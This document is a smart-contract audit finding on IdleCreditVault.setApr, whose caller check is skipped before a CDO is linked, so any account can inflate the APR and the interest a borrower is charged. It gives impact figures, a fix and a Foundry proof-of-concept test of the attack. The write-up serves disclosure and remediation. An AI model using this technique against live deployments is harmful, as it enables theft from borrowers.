### Title
Unauthenticated APR manipulation before IdleCDO configuration inflates borrower obligations - (File: `contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
`IdleCreditVault.setApr` disables its caller check whenever `idleCDO == address(0)`, allowing any EOA to change `lastApr` during the deployment/configuration window. If the strategy proxy is initialized before its CDO is deployed and linked, an attacker can raise the APR to `DEFAULT_MAX_APR` and cause subsequent epochs to calculate an inflated borrower repayment. [1](#0-0) 

### Finding Description
`setApr` is intended to be callable only by the configured CDO or manager, but the authorization check is conditional on `idleCDO` already being set. [1](#0-0)   
Before `setWhitelistedCDO` runs, an unprivileged caller can therefore set `lastApr` up to `DEFAULT_MAX_APR`, while `setAprs` can independently replace `unscaledApr`. [2](#0-1)   
The CDO reads `getApr()` during initialization and uses the strategy APR when calculating `expectedEpochInterest` at `startEpoch`. [3](#0-2) [4](#0-3)   
At `stopEpoch`, the CDO attempts to pull `expectedEpochInterest` plus pending withdrawals from the borrower. [5](#0-4) 

### Impact Explanation
An attacker who is eligible to deposit can force the vault to charge the maximum permitted APR rather than the intended APR. For example, a 1,000,000-underlying pool manipulated from a 1% APR to the 20% cap creates approximately 19,178 underlying of excess borrower obligation over a 35-day epoch-plus-buffer period, before fees. [6](#0-5) [4](#0-3)   
If the borrower has sufficient allowance, `stopEpoch` transfers that inflated amount into the pool, where it increases attacker-controlled tranche NAV and can be withdrawn through the normal redemption path. [7](#0-6) 

### Likelihood Explanation
The normal `IdleCreditVaultFactory` path configures APR and links the CDO atomically, so this issue requires a manual or multi-transaction deployment in which strategy initialization and `setWhitelistedCDO` are not atomic. [8](#0-7)   
In such a deployment, no privileged role compromise is needed because the authorization check is deliberately skipped while `idleCDO` is unset. [1](#0-0) 

### Recommendation
Do not exempt uninitialized strategies from APR authorization. Permit the setup caller by passing an explicit temporary configurator during initialization, or add a dedicated one-time `initializeApr` path that is disabled before external transactions can occur. At minimum, require `msg.sender == owner() || msg.sender == manager` whenever `idleCDO == address(0)`, and make production deployment/configuration atomic. [1](#0-0)

function test_UnauthenticatedAprManipulation() public {
    // Deploy underlying, proxy admin, implementations, owner, manager, borrower,
    // and a KYC-passing attacker using the repository's existing Foundry fixtures.

    IdleCreditVault strategy = IdleCreditVault(
        address(new TransparentUpgradeableProxy(
            address(strategyImpl),
            address(proxyAdmin),
            abi.encodeWithSelector(
                IdleCreditVault.initialize.selector,
                address(underlying),
                owner,
                manager,
                borrower,
                "Borrower",
                1e18 // intended 1% unscaled APR
            )
        ))
    );

    // The strategy has not yet been linked to a CDO, so the caller check is skipped.
    // With the default 30-day epoch and 5-day buffer, this value is scaled to
    // approximately DEFAULT_MAX_APR during CDO initialization.
    vm.prank(attacker);
    strategy.setApr(17_142857142857142857);

    IdleCDOEpochVariant cdo = IdleCDOEpochVariant(
        address(new TransparentUpgradeableProxy(
            address(cdoImpl),
            address(proxyAdmin),
            abi.encodeWithSelector(
                IdleCDOCreditVault.initialize.selector,
                0,
                address(underlying),
                treasury,
                owner,
                address(0),
                address(strategy),
                100_000
            )
        ))
    );

    vm.prank(owner);
    strategy.setWhitelistedCDO(address(cdo));

    // The manipulated APR has been accepted even though the attacker was neither
    // the manager nor the CDO.
    assertGt(strategy.getApr(), 19e18);

    // Attacker deposits after configuration and before the epoch starts.
    uint256 principal = 1_000_000e6;
    underlying.mint(attacker, principal);
    vm.startPrank(attacker);
    underlying.approve(address(cdo), principal);
    cdo.depositAA(principal);
    vm.stopPrank();

    vm.prank(manager);
    cdo.startEpoch();

    // Honest borrower previously approved the CDO for repayment.
    vm.prank(borrower);
    underlying.approve(address(cdo), type(uint256).max);

    vm.warp(cdo.epochEndDate());
    uint256 borrowerBefore = underlying.balanceOf(borrower);

    vm.prank(manager);
    cdo.stopEpoch(0, 0);

    // The pulled interest reflects the manipulated ~20% scaled APR rather than
    // the intended 1% rate.
    uint256 legitimateInterest =
        principal * 1e18 * (30 days + 5 days) / (100e18 * 365 days);
    uint256 actualInterest =
        principal * strategy.getApr() * 30 days / (100e18 * 365 days);

    assertGt(actualInterest, legitimateInterest);
    assertApproxEqAbs(
        borrowerBefore - underlying.balanceOf(borrower),
        actualInterest,
        1
    );
}
